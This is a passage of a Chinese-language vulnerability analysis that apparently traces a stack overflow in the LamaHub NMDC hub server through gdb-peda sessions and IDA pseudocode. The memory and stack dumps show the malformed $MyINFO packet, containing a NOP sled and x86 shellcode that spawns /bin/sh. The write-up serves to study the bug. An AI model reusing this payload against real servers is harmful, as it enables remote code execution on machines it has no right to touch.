+#1&nbsp;&nbsp;0x080626d6&nbsp;in&nbsp;buf&nbsp;()
+#2&nbsp;&nbsp;0xb1b1b1b1&nbsp;in&nbsp;??&nbsp;()
+#3&nbsp;&nbsp;0xb1b1b1b1&nbsp;in&nbsp;??&nbsp;()
+Backtrace&nbsp;stopped:&nbsp;previous&nbsp;frame&nbsp;inner&nbsp;to&nbsp;this&nbsp;frame&nbsp;(corrupt&nbsp;stack?)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">由于NMDC数据包构造的原因，后续堆栈已经被畸形payload覆盖，导致回溯失败，通过正向分析可以找到这个漏洞的成因。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过IDA pro分析可以找到两处recv，在LamaHub接收数据的时候势必会调用recv函数，在这两处recv下断点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;b&nbsp;*0x08052ef7
+Breakpoint&nbsp;1&nbsp;at&nbsp;0x8052ef7
+gdb-peda$&nbsp;r
+Starting&nbsp;program:&nbsp;/root/Desktop/0.0.6.2/server&nbsp;
+&gt;&nbsp;init&nbsp;()&nbsp;-&gt;&nbsp;OK
+&gt;&nbsp;started&nbsp;on&nbsp;port&nbsp;-&gt;&nbsp;4111
+&gt;&nbsp;new&nbsp;client&nbsp;-&gt;&nbsp;127.0.0.1&nbsp;-&gt;&nbsp;4
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x4&nbsp;
+EBX:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+ECX:&nbsp;0x4&nbsp;
+EDX:&nbsp;0x10&nbsp;
+ESI:&nbsp;0x0&nbsp;
+EDI:&nbsp;0x0&nbsp;
+EBP:&nbsp;0xbffff438&nbsp;--&gt;&nbsp;0x0&nbsp;
+ESP:&nbsp;0xbffff3f0&nbsp;--&gt;&nbsp;0x4&nbsp;
+EIP:&nbsp;0x8052ef7&nbsp;(&lt;loop+231&gt;:call&nbsp;&nbsp;&nbsp;0x8049210&nbsp;&lt;recv@plt&gt;)
+EFLAGS:&nbsp;0x203&nbsp;(CARRY&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8052eea&nbsp;&lt;loop+218&gt;:push&nbsp;&nbsp;&nbsp;0x8066a00
+&nbsp;&nbsp;&nbsp;0x8052eef&nbsp;&lt;loop+223&gt;:push&nbsp;&nbsp;&nbsp;ecx
+&nbsp;&nbsp;&nbsp;0x8052ef0&nbsp;&lt;loop+224&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;ds:0x8066a00,0x0
+=&gt;&nbsp;0x8052ef7&nbsp;&lt;loop+231&gt;:call&nbsp;&nbsp;&nbsp;0x8049210&nbsp;&lt;recv@plt&gt;
+&nbsp;&nbsp;&nbsp;0x8052efc&nbsp;&lt;loop+236&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8052eff&nbsp;&lt;loop+239&gt;:test&nbsp;&nbsp;&nbsp;eax,eax
+&nbsp;&nbsp;&nbsp;0x8052f01&nbsp;&lt;loop+241&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;ds:0x8062b04,eax
+&nbsp;&nbsp;&nbsp;0x8052f06&nbsp;&lt;loop+246&gt;:je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x8052f40&nbsp;&lt;loop+304&gt;
+Guessed&nbsp;arguments:
+arg[0]:&nbsp;0x4&nbsp;
+arg[1]:&nbsp;0x8066a00&nbsp;--&gt;&nbsp;0x0&nbsp;
+arg[2]:&nbsp;0x3ff&nbsp;
+arg[3]:&nbsp;0x0</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">发送payload后，程序命中了一处断点，之后单步步过。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;n
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x1b1&nbsp;
+EBX:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+ECX:&nbsp;0xbffff3f0&nbsp;--&gt;&nbsp;0x4&nbsp;
+EDX:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+ESI:&nbsp;0x0&nbsp;
+EDI:&nbsp;0x0&nbsp;
+EBP:&nbsp;0xbffff438&nbsp;--&gt;&nbsp;0x0&nbsp;
+ESP:&nbsp;0xbffff3f0&nbsp;--&gt;&nbsp;0x4&nbsp;
+EIP:&nbsp;0x8052efc&nbsp;(&lt;loop+236&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10)
+EFLAGS:&nbsp;0x217&nbsp;(CARRY&nbsp;PARITY&nbsp;ADJUST&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8052eef&nbsp;&lt;loop+223&gt;:push&nbsp;&nbsp;&nbsp;ecx
+&nbsp;&nbsp;&nbsp;0x8052ef0&nbsp;&lt;loop+224&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;ds:0x8066a00,0x0
+&nbsp;&nbsp;&nbsp;0x8052ef7&nbsp;&lt;loop+231&gt;:call&nbsp;&nbsp;&nbsp;0x8049210&nbsp;&lt;recv@plt&gt;
+=&gt;&nbsp;0x8052efc&nbsp;&lt;loop+236&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8052eff&nbsp;&lt;loop+239&gt;:test&nbsp;&nbsp;&nbsp;eax,eax
+&nbsp;&nbsp;&nbsp;0x8052f01&nbsp;&lt;loop+241&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;ds:0x8062b04,eax
+&nbsp;&nbsp;&nbsp;0x8052f06&nbsp;&lt;loop+246&gt;:je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x8052f40&nbsp;&lt;loop+304&gt;
+&nbsp;&nbsp;&nbsp;0x8052f08&nbsp;&lt;loop+248&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[eax+0x8066a00],0x0
+Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
+0x08052efc&nbsp;in&nbsp;loop&nbsp;()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到，此时堆0x08066a00位置接收了数据包并且进行了保存，查看一下这个堆中的内容。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;x/100x&nbsp;0x08066a00
+0x8066a00&nbsp;&lt;buf&gt;:0x707553240x74726f700x735520730x206f6c6c
+0x8066a10&nbsp;&lt;buf+16&gt;:0x203250490x637261650x505a20680x7c203065
+0x8066a20&nbsp;&lt;buf+32&gt;:0x79654b240x56247c610x64696c610x4e657461
+0x8066a30&nbsp;&lt;buf+48&gt;:0x206b63690x726569500x247c65720x206e6556
+0x8066a40&nbsp;&lt;buf+64&gt;:0x30302c310x247c31390x4e0001470x4c6b633b
+0x8066a50&nbsp;&lt;buf+80&gt;:0x7c7473690x49794d240x204f464e0x4c4c4124
+0x8066a60&nbsp;&lt;buf+96&gt;:0x656950200x206572720x9090654a0x90909090
+0x8066a70&nbsp;&lt;buf+112&gt;:0x909090900x909090900x909090900x90909090
+0x8066a80&nbsp;&lt;buf+128&gt;:0x909090900x909090900x6850c0310x68732f2f
+0x8066a90&nbsp;&lt;buf+144&gt;:0x69622f680x31e3896e0x6aca89c90x80cd580b
+0x8066aa0&nbsp;&lt;buf+160&gt;:0x909090900x909090900x909090900x90909090
+0x8066ab0&nbsp;&lt;buf+176&gt;:0x909090900x909090900x909090900x90909090
+0x8066ac0&nbsp;&lt;buf+192&gt;:0x909090900x909090900x3c6190900x794d243c
+0x8066ad0&nbsp;&lt;buf+208&gt;:0x243500800x302469700x373737240x37373737
+0x8066ae0&nbsp;&lt;buf+224&gt;:0x373737370xb1b1b1370xb1b1b1b10xb1b1b1b1</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">畸形数据已经全被被接收了，接下来单步跟踪。在接收到数据之后，会到达一处调用，地址为0x8052e82的call parse_token，这个主要是负责验证逻辑。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;n
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x1b1&nbsp;
+EBX:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+ECX:&nbsp;0xbffff3f0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+EDX:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+ESI:&nbsp;0x0&nbsp;
+EDI:&nbsp;0x0&nbsp;
+EBP:&nbsp;0xbffff438&nbsp;--&gt;&nbsp;0x0&nbsp;
+ESP:&nbsp;0xbffff3f0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+EIP:&nbsp;0x8052e82&nbsp;(&lt;loop+114&gt;:call&nbsp;&nbsp;&nbsp;0x8050cf0&nbsp;&lt;parse_token&gt;)
+EFLAGS:&nbsp;0x296&nbsp;(carry&nbsp;PARITY&nbsp;ADJUST&nbsp;zero&nbsp;SIGN&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8052e7b&nbsp;&lt;loop+107&gt;:push&nbsp;&nbsp;&nbsp;eax
+&nbsp;&nbsp;&nbsp;0x8052e7c&nbsp;&lt;loop+108&gt;:push&nbsp;&nbsp;&nbsp;0x8066a00
+&nbsp;&nbsp;&nbsp;0x8052e81&nbsp;&lt;loop+113&gt;:push&nbsp;&nbsp;&nbsp;ebx
+=&gt;&nbsp;0x8052e82&nbsp;&lt;loop+114&gt;:call&nbsp;&nbsp;&nbsp;0x8050cf0&nbsp;&lt;parse_token&gt;
+&nbsp;&nbsp;&nbsp;0x8052e87&nbsp;&lt;loop+119&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8052e8a&nbsp;&lt;loop+122&gt;:cmp&nbsp;&nbsp;&nbsp;&nbsp;eax,0xffffffff
+&nbsp;&nbsp;&nbsp;0x8052e8d&nbsp;&lt;loop+125&gt;:je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x8052f4c&nbsp;&lt;loop+316&gt;
+&nbsp;&nbsp;&nbsp;0x8052e93&nbsp;&lt;loop+131&gt;:sub&nbsp;&nbsp;&nbsp;&nbsp;esp,0xc
+Guessed&nbsp;arguments:
+arg[0]:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+arg[1]:&nbsp;0x8066a00&nbsp;(&quot;$Supports&nbsp;Usllo&nbsp;IP2&nbsp;earch&nbsp;ZPe0&nbsp;|$Keya|$ValidateNick&nbsp;Pierre|$Ven&nbsp;1,0091|$G\001&quot;)
+arg[2]:&nbsp;0x1b1</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到这处验证逻辑第二个参数就是畸形payload，接下来分析这处验证逻辑。通过IDA pro查看一下这个函数伪代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;__cdecl&nbsp;parse_token(void&nbsp;*a1,&nbsp;char&nbsp;*src,&nbsp;size_t&nbsp;a3)
+{
+……省略部分代码
+LABEL_19:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v11&nbsp;=&nbsp;v3;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(&amp;token_buf&nbsp;+&nbsp;n)&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;proto_state_handler(a1,&nbsp;&amp;token_buf,&nbsp;n);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v3&nbsp;=&nbsp;v11;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;result&nbsp;==&nbsp;-1&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_12;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(&nbsp;!(n&nbsp;&amp;&nbsp;1)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_19;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;v8[v10]&nbsp;=&nbsp;v9[v10];
+&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_19;
+&nbsp;&nbsp;}
+&nbsp;&nbsp;return&nbsp;result;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在LABEL_19块中，调用了一个函数proto_state_handler，主要是负责处理协议句柄的，其中涉及到一个token_buf，单步跟踪观察这个proto_state_handler函数调用的传参情况。注意看stack栈中的情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x20&nbsp;(&#39;&nbsp;&#39;)
+EBX:&nbsp;0x0&nbsp;
+ECX:&nbsp;0x0&nbsp;
+EDX:&nbsp;0x1b1&nbsp;
+ESI:&nbsp;0x8066a20&nbsp;(&quot;$Keya|$ValidateNick&nbsp;Pierre|$Ven&nbsp;1,0091|$G\001&quot;)
+EDI:&nbsp;0x8062720&nbsp;--&gt;&nbsp;0x0&nbsp;
+EBP:&nbsp;0x8066a00&nbsp;(&quot;$Supports&nbsp;Usllo&nbsp;IP2&nbsp;earch&nbsp;ZPe0&nbsp;|$Keya|$ValidateNick&nbsp;Pierre|$Ven&nbsp;1,0091|$G\001&quot;)
+ESP:&nbsp;0xbffff3a0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+EIP:&nbsp;0x8050ddb&nbsp;(&lt;parse_token+235&gt;:call&nbsp;&nbsp;&nbsp;0x80551b0&nbsp;&lt;proto_state_handler&gt;)
+EFLAGS:&nbsp;0x296&nbsp;(carry&nbsp;PARITY&nbsp;ADJUST&nbsp;zero&nbsp;SIGN&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8050dcb&nbsp;&lt;parse_token+219&gt;:push&nbsp;&nbsp;&nbsp;0x8062700
+&nbsp;&nbsp;&nbsp;0x8050dd0&nbsp;&lt;parse_token+224&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0x24]
+&nbsp;&nbsp;&nbsp;0x8050dd4&nbsp;&lt;parse_token+228&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[eax+0x8062700],0x0
+=&gt;&nbsp;0x8050ddb&nbsp;&lt;parse_token+235&gt;:call&nbsp;&nbsp;&nbsp;0x80551b0&nbsp;&lt;proto_state_handler&gt;
+&nbsp;&nbsp;&nbsp;0x8050de0&nbsp;&lt;parse_token+240&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8050de3&nbsp;&lt;parse_token+243&gt;:cmp&nbsp;&nbsp;&nbsp;&nbsp;eax,0xffffffff
+&nbsp;&nbsp;&nbsp;0x8050de6&nbsp;&lt;parse_token+246&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;edx,DWORD&nbsp;PTR&nbsp;[esp+0x1c]
+&nbsp;&nbsp;&nbsp;0x8050dea&nbsp;&lt;parse_token+250&gt;:jne&nbsp;&nbsp;&nbsp;&nbsp;0x8050d78&nbsp;&lt;parse_token+136&gt;
+No&nbsp;argument
+[------------------------------------stack-------------------------------------]
+0000|&nbsp;0xbffff3a0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+0004|&nbsp;0xbffff3a4&nbsp;--&gt;&nbsp;0x8062700&nbsp;(&quot;$Supports&nbsp;Usllo&nbsp;IP2&nbsp;earch&nbsp;ZPe0&nbsp;|&quot;)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个token_buf的内容是$Supports，其实这个主要是NDMC的协议处理，而在parse_token的开始部分，会先处理这个数据包，将数据包内容拆分。接下来直接执行，会第二次到达断点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8050dcb&nbsp;&lt;parse_token+219&gt;:push&nbsp;&nbsp;&nbsp;0x8062700
+&nbsp;&nbsp;&nbsp;0x8050dd0&nbsp;&lt;parse_token+224&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0x24]
+&nbsp;&nbsp;&nbsp;0x8050dd4&nbsp;&lt;parse_token+228&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[eax+0x8062700],0x0
+=&gt;&nbsp;0x8050ddb&nbsp;&lt;parse_token+235&gt;:call&nbsp;&nbsp;&nbsp;0x80551b0&nbsp;&lt;proto_state_handler&gt;
+&nbsp;&nbsp;&nbsp;0x8050de0&nbsp;&lt;parse_token+240&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8050de3&nbsp;&lt;parse_token+243&gt;:cmp&nbsp;&nbsp;&nbsp;&nbsp;eax,0xffffffff
+&nbsp;&nbsp;&nbsp;0x8050de6&nbsp;&lt;parse_token+246&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;edx,DWORD&nbsp;PTR&nbsp;[esp+0x1c]
+&nbsp;&nbsp;&nbsp;0x8050dea&nbsp;&lt;parse_token+250&gt;:jne&nbsp;&nbsp;&nbsp;&nbsp;0x8050d78&nbsp;&lt;parse_token+136&gt;
+No&nbsp;argument
+[------------------------------------stack-------------------------------------]
+0000|&nbsp;0xbffff3a0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+0004|&nbsp;0xbffff3a4&nbsp;--&gt;&nbsp;0x8062700&nbsp;(&quot;$Keya|&quot;)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">继续执行，第三次命中</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8050dcb&nbsp;&lt;parse_token+219&gt;:push&nbsp;&nbsp;&nbsp;0x8062700
+&nbsp;&nbsp;&nbsp;0x8050dd0&nbsp;&lt;parse_token+224&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0x24]
+&nbsp;&nbsp;&nbsp;0x8050dd4&nbsp;&lt;parse_token+228&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[eax+0x8062700],0x0
+=&gt;&nbsp;0x8050ddb&nbsp;&lt;parse_token+235&gt;:call&nbsp;&nbsp;&nbsp;0x80551b0&nbsp;&lt;proto_state_handler&gt;
+&nbsp;&nbsp;&nbsp;0x8050de0&nbsp;&lt;parse_token+240&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8050de3&nbsp;&lt;parse_token+243&gt;:cmp&nbsp;&nbsp;&nbsp;&nbsp;eax,0xffffffff
+&nbsp;&nbsp;&nbsp;0x8050de6&nbsp;&lt;parse_token+246&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;edx,DWORD&nbsp;PTR&nbsp;[esp+0x1c]
+&nbsp;&nbsp;&nbsp;0x8050dea&nbsp;&lt;parse_token+250&gt;:jne&nbsp;&nbsp;&nbsp;&nbsp;0x8050d78&nbsp;&lt;parse_token+136&gt;
+No&nbsp;argument
+[------------------------------------stack-------------------------------------]
+0000|&nbsp;0xbffff3a0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+0004|&nbsp;0xbffff3a4&nbsp;--&gt;&nbsp;0x8062700&nbsp;(&quot;$ValidateNick&nbsp;Pierre|&quot;)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到每次都获取到|分割线后的内容，接下来直接执行到包含畸形字符串的部分。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8050dcb&nbsp;&lt;parse_token+219&gt;:push&nbsp;&nbsp;&nbsp;0x8062700
+&nbsp;&nbsp;&nbsp;0x8050dd0&nbsp;&lt;parse_token+224&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0x24]
+&nbsp;&nbsp;&nbsp;0x8050dd4&nbsp;&lt;parse_token+228&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[eax+0x8062700],0x0
+=&gt;&nbsp;0x8050ddb&nbsp;&lt;parse_token+235&gt;:call&nbsp;&nbsp;&nbsp;0x80551b0&nbsp;&lt;proto_state_handler&gt;
+&nbsp;&nbsp;&nbsp;0x8050de0&nbsp;&lt;parse_token+240&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8050de3&nbsp;&lt;parse_token+243&gt;:cmp&nbsp;&nbsp;&nbsp;&nbsp;eax,0xffffffff
+&nbsp;&nbsp;&nbsp;0x8050de6&nbsp;&lt;parse_token+246&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;edx,DWORD&nbsp;PTR&nbsp;[esp+0x1c]
+&nbsp;&nbsp;&nbsp;0x8050dea&nbsp;&lt;parse_token+250&gt;:jne&nbsp;&nbsp;&nbsp;&nbsp;0x8050d78&nbsp;&lt;parse_token+136&gt;
+No&nbsp;argument
+[------------------------------------stack-------------------------------------]
+0000|&nbsp;0xbffff3a0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+0004|&nbsp;0xbffff3a4&nbsp;--&gt;&nbsp;0x8062700&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+0008|&nbsp;0xbffff3a8&nbsp;--&gt;&nbsp;0x144&nbsp;
+0012|&nbsp;0xbffff3ac&nbsp;--&gt;&nbsp;0x0&nbsp;
+0016|&nbsp;0xbffff3b0&nbsp;--&gt;&nbsp;0xbffff438&nbsp;--&gt;&nbsp;0x0&nbsp;
+0020|&nbsp;0xbffff3b4&nbsp;--&gt;&nbsp;0xb7de16b8&nbsp;--&gt;&nbsp;0x1785&nbsp;
+0024|&nbsp;0xbffff3b8&nbsp;--&gt;&nbsp;0x79&nbsp;(&#39;y&#39;)
+0028|&nbsp;0xbffff3bc&nbsp;--&gt;&nbsp;0x197&nbsp;
+[------------------------------------------------------------------------------]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二个参数作为畸形字符串传入，其中涉及到指令$MyINFO，就从这里跟入看看函数内部到底发生了什么。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;proto_state_handler&nbsp;(user_t&nbsp;*u,&nbsp;char&nbsp;*data,&nbsp;unsigned&nbsp;int&nbsp;len)
+{
+switch&nbsp;(u-&gt;state)&nbsp;{
+case&nbsp;PROTO_STATE_INIT://&nbsp;new&nbsp;user&nbsp;connected
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;proto_nmdc_state_init&nbsp;(u);
+case&nbsp;PROTO_STATE_SENDLOCK://&nbsp;waiting&nbsp;for&nbsp;user&nbsp;$Key
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;proto_nmdc_state_sendlock&nbsp;(u,&nbsp;data,&nbsp;len);
+case&nbsp;PROTO_STATE_WAITNICK://&nbsp;waiting&nbsp;for&nbsp;user&nbsp;$ValidateNick
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;proto_nmdc_state_waitnick&nbsp;(u,&nbsp;data,&nbsp;len);
+case&nbsp;PROTO_STATE_WAITPASS://&nbsp;waiting&nbsp;for&nbsp;user&nbsp;$GetPass
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;proto_nmdc_state_waitpass&nbsp;(u,&nbsp;data,&nbsp;len);
+case&nbsp;PROTO_STATE_HELLO://&nbsp;waiting&nbsp;for&nbsp;user&nbsp;$MyINFO
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;proto_nmdc_state_hello&nbsp;(u,&nbsp;data,&nbsp;len);
+case&nbsp;PROTO_STATE_ONLINE://&nbsp;user&nbsp;is&nbsp;avaible&nbsp;now
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;proto_nmdc_state_online&nbsp;(u,&nbsp;data,&nbsp;len);
+case&nbsp;PROTO_STATE_DISCONNECTED://&nbsp;user&nbsp;gone&nbsp;out&nbsp;&nbsp;&nbsp;&nbsp;$Quit
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;proto_nmdc_state_disconnect&nbsp;(u);
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">进入后会到达一处switch逻辑，这个switch会根据user_t的类型进行判断，根据情况进行处理，在$MyINFO会进入proto_nmdc_state_hello函数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;n
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x4&nbsp;
+EBX:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+ECX:&nbsp;0x0&nbsp;
+EDX:&nbsp;0x1b1&nbsp;
+ESI:&nbsp;0x8066b98&nbsp;(&quot;$Keya|$V&nbsp;A&nbsp;0a|$Vick&nbsp;Pi\312\312\n&quot;)
+EDI:&nbsp;0x8062844&nbsp;--&gt;&nbsp;0x0&nbsp;
+EBP:&nbsp;0x8066a54&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
